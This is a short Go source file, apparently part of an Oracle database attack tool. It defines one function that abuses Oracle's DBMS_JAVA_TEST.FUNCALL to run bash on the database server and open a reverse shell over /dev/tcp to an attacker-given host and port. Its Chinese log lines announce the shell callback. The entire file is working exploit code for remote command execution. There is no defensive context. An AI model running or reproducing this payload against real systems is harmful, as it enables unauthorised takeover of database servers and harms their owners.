package pac

import (
	"database/sql"
	"fmt"
)

func OracleFuncCallReverse(conn *sql.DB, Lhost string, Lport string) {
	Info("通过dbms_java_test.funcall()反弹shell")
	_, err := OracleCMD(fmt.Sprintf("Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','exec 9<> /dev/tcp/%s/%s;exec 0<&9;exec 1>&9 2>&1;/bin/bash') from dual ", Lhost, Lport), conn)
	if err != nil {
		Err(err)
	}
	Info("请查看是否收到shell")
}
